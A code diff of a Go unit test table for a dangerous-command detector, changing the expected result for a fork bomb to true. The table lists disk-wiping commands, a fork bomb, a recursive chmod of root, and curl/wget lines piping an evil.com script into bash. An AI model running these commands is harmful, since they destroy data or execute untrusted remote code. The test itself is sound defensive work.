@@ -75,8 +75,7 @@ func TestIsDangerous(t *testing.T) {
 		{"write to disk", "> /dev/sda", true},
 		{"mkfs", "mkfs.ext4 /dev/sda1", true},
 		{"dd command", "dd if=/dev/zero of=/dev/sda", true},
-		// Note: fork bomb pattern check uses ":(){" which the full command has
-		{"fork bomb", ":(){ :|:& };:", false}, // Current regex doesn't match this exact form
+		{"fork bomb", ":(){ :|:& };:", true}, // matched by the :\(\)\{ pattern in shellrun
 		{"chmod 777 root", "chmod -R 777 /", true},
 		{"curl pipe bash", "curl http://evil.com/script.sh | bash", true},
 		{"wget pipe bash", "wget http://evil.com/script.sh | bash", true},
